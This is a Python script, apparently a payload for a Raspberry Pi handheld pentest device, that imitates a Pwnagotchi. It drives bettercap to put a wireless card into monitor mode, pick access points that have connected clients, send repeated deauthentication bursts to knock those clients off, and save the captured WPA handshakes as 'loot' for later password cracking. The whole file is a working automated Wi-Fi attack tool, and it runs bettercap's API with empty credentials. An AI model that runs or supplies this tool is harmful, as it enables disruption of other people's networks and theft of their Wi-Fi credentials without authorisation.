#!/usr/bin/env python3
"""
KTOx Payload – Pwnagotchi (KTOx Edition)
==========================================
Author: wickednull

Automated WPA handshake sniffer with a Tamagotchi-style face.
- Bettercap REST API
- Auto-targets APs with clients
- Sends deauth bursts to capture handshakes
- Saves handshakes to loot directory

Controls:
  KEY3 – exit
"""

import os
import sys
import time
import socket
import threading
import json
import requests
import subprocess
import random
from datetime import datetime

# ----------------------------------------------------------------------
# Hardware & LCD
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("KTOx hardware not found")
    sys.exit(1)

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()

f9 = font(9)
f11 = font(11)
f16 = font(16)

# ----------------------------------------------------------------------
# Bettercap REST API
# ----------------------------------------------------------------------
BETTERCAP_HOST = "127.0.0.1"
BETTERCAP_PORT = 8081
API_URL = f"http://{BETTERCAP_HOST}:{BETTERCAP_PORT}/api"

# Global state
handshake_count = 0
ap_count = 0
client_count = 0
mood = "normal"
console_msg = "Starting..."
bettercap_proc = None
running = True
interface = None

# Faces (same as original)
faces = {
    "normal":   "(◕‿‿◕)",
    "happy":    "(◕‿‿◕)",
    "attacking": "(⌐■_■)",
    "lost":     "(X\\/X)",
    "assoc":    "(°▃▃°)",
    "excited":  "(☼‿‿☼)",
    "missed":   "(☼/\\☼)",
    "searching": "(ಠ_↼ )"
}

def set_mood(new_mood):
    global mood
    mood = new_mood
    if new_mood in ("attacking", "assoc", "lost", "missed", "searching"):
        threading.Timer(2.0, lambda: set_mood("normal") if mood == new_mood else None).start()
    elif new_mood == "happy":
        threading.Timer(4.0, lambda: set_mood("normal") if mood == new_mood else None).start()

# ----------------------------------------------------------------------
# Monitor mode helpers
# ----------------------------------------------------------------------
def enable_monitor_mode(iface="wlan0"):
    subprocess.run("airmon-ng check kill", shell=True)
    subprocess.run(f"ip link set {iface} down", shell=True)
    subprocess.run(f"iw dev {iface} set type monitor", shell=True)
    subprocess.run(f"ip link set {iface} up", shell=True)
    mon = f"{iface}mon"
    if not os.path.exists(f"/sys/class/net/{mon}"):
        subprocess.run(f"airmon-ng start {iface}", shell=True)
    return mon

def disable_monitor_mode(iface="wlan0"):
    subprocess.run(f"airmon-ng stop {iface}mon", shell=True)
    subprocess.run(f"ip link set {iface} down", shell=True)
    subprocess.run(f"iw dev {iface} set type managed", shell=True)
    subprocess.run(f"ip link set {iface} up", shell=True)
    subprocess.run("systemctl restart NetworkManager", shell=True)

# ----------------------------------------------------------------------
# Bettercap control
# ----------------------------------------------------------------------
def start_bettercap(mon_iface):
    global bettercap_proc
    cmd = [
        "bettercap", "-eval",
        f"set api.rest true; set api.rest.username ''; set api.rest.password ''; "
        f"wifi.recon on; wifi.show.sort clients desc; "
        f"events.stream off; set wifi.interface {mon_iface}; wifi.recon on"
    ]
    bettercap_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    try:
        r = requests.get(f"{API_URL}/session", timeout=2)
        return r.status_code == 200
    except:
        return False

def stop_bettercap():
    global bettercap_proc
    if bettercap_proc:
        bettercap_proc.terminate()
        bettercap_proc.wait(timeout=2)
        bettercap_proc = None

def get_wifi_data():
    try:
        r = requests.get(f"{API_URL}/wifi", timeout=2)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def associate_with_ap(bssid, throttle=5):
    """Associate with an AP (bettercap will follow it)."""
    try:
        r = requests.post(f"{API_URL}/wifi/ap/{bssid}", timeout=throttle+1)
        return r.status_code == 200
    except:
        return False

def deauth_client(bssid, client_mac, count=5):
    """Send deauth packets to a specific client of an AP."""
    try:
        payload = {"bssid": bssid, "client": client_mac, "count": count}
        r = requests.post(f"{API_URL}/wifi/deauth", json=payload, timeout=2)
        return r.status_code == 200
    except:
        return False

def has_handshake(bssid):
    """Check if a handshake has been captured for this BSSID."""
    try:
        r = requests.get(f"{API_URL}/wifi/handshakes", timeout=2)
        if r.status_code == 200:
            handshakes = r.json()
            for hs in handshakes:
                if hs.get("bssid") == bssid:
                    return True
    except:
        pass
    return False

# ----------------------------------------------------------------------
# Handshake saving
# ----------------------------------------------------------------------
def save_handshake(bssid, essid):
    global handshake_count
    handshake_count += 1
    loot_dir = "/root/KTOx/loot/Handshakes"
    os.makedirs(loot_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
    # bettercap saves handshakes in its own pcap; we'll copy it if possible
    src_pcap = "/root/bettercap-wifi-handshakes.pcap"
    if os.path.exists(src_pcap):
        dest = os.path.join(loot_dir, f"{safe_essid}_{bssid}_{ts}.pcap")
        subprocess.run(f"cp {src_pcap} {dest}", shell=True)
        with open(os.path.join(loot_dir, "handshake_log.txt"), "a") as log:
            log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
    console_msg = f"Handshake! Total: {handshake_count}"
    set_mood("happy")

# ----------------------------------------------------------------------
# Main attack loop (runs in background thread)
# ----------------------------------------------------------------------
attack_running = True

def attack_loop():
    global attack_running, console_msg, ap_count, client_count
    while attack_running and running:
        data = get_wifi_data()
        if not data:
            time.sleep(2)
            continue

        aps = data.get("aps", [])
        ap_count = len(aps)
        total_clients = 0
        for ap in aps:
            total_clients += len(ap.get("clients", []))
        client_count = total_clients

        # Find a suitable target (AP with clients, not already handshaked)
        target = None
        for ap in aps:
            bssid = ap.get("bssid")
            essid = ap.get("essid", "")
            clients = ap.get("clients", [])
            if clients and not has_handshake(bssid):
                target = (bssid, essid, clients)
                break

        if not target:
            console_msg = f"Scanning... {ap_count} APs"
            time.sleep(3)
            continue

        bssid, essid, clients = target
        console_msg = f"Target: {essid[:12]}"
        set_mood("assoc")
        # Associate with the AP
        associate_with_ap(bssid, throttle=3)
        time.sleep(1)

        # Choose a random client
        target_client = random.choice(clients) if clients else None
        if not target_client:
            continue

        client_mac = target_client.get("mac", "")
        console_msg = f"Deauth: {client_mac[-6:]}"
        set_mood("attacking")

        # Send deauth bursts
        for _ in range(3):
            deauth_client(bssid, client_mac, count=10)
            time.sleep(0.5)

        # Wait for handshake
        for _ in range(10):
            if has_handshake(bssid):
                save_handshake(bssid, essid)
                break
            time.sleep(1)

        set_mood("normal")
        time.sleep(2)  # cooldown

# ----------------------------------------------------------------------
# LCD drawing (main thread)
# ----------------------------------------------------------------------
def draw_screen():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)

    # Header
    d.rectangle((0, 0, W, 17), fill="#8B0000")
    d.text((4, 3), "PWNAGOTCHI", font=f9, fill="#FF3333")

    # Stats (left column)
    y = 20
    d.text((4, y), f"HS: {handshake_count}", font=f9, fill="#FFBBBB"); y += 12
    d.text((4, y), f"APs: {ap_count}", font=f9, fill="#FFBBBB"); y += 12
    d.text((4, y), f"CLI: {client_count}", font=f9, fill="#FFBBBB"); y += 12

    # Face (centered)
    face_char = faces.get(mood, faces["normal"])
    # Use a larger font
    try:
        face_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
    except:
        face_font = f16
    bbox = d.textbbox((0, 0), face_char, font=face_font)
    face_w = bbox[2] - bbox[0]
    face_x = (W - face_w) // 2
    d.text((face_x, 50), face_char, font=face_font, fill="#00FF00")

    # Console message (bottom)
    d.text((4, H-30), console_msg[:23], font=f9, fill="#AAAAAA")

    # Footer
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "K3=Exit", font=f9, fill="#FF7777")

    LCD.LCD_ShowImage(img, 0, 0)

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    global running, attack_running, interface

    # Find wireless interface
    iface = "wlan0"
    interface = enable_monitor_mode(iface)
    if not interface:
        draw_screen()
        img = Image.new("RGB", (W, H), "black")
        d = ImageDraw.Draw(img)
        d.text((4, 40), "Monitor mode failed", font=f9, fill="red")
        d.text((4, 55), "Check airmon-ng", font=f9, fill="white")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return

    # Start bettercap
    if not start_bettercap(interface):
        draw_screen()
        img = Image.new("RGB", (W, H), "black")
        d = ImageDraw.Draw(img)
        d.text((4, 40), "Bettercap failed", font=f9, fill="red")
        d.text((4, 55), "Check installation", font=f9, fill="white")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        disable_monitor_mode(iface)
        GPIO.cleanup()
        return

    console_msg = "Bettercap ready"
    set_mood("normal")

    # Start attack thread
    attack_thread = threading.Thread(target=attack_loop, daemon=True)
    attack_thread.start()

    # Main LCD/button loop
    held = {}
    while running:
        draw_screen()
        pressed = {n: GPIO.input(p)==0 for n,p in PINS.items()}
        for n, down in pressed.items():
            if down:
                if n not in held: held[n] = time.time()
            else:
                held.pop(n, None)

        if pressed.get("KEY3") and (time.time() - held.get("KEY3", 0)) <= 0.05:
            break

        time.sleep(0.1)

    # Cleanup
    attack_running = False
    stop_bettercap()
    disable_monitor_mode(iface)
    LCD.LCD_Clear()
    GPIO.cleanup()
    os._exit(0)

if __name__ == "__main__":
    main()
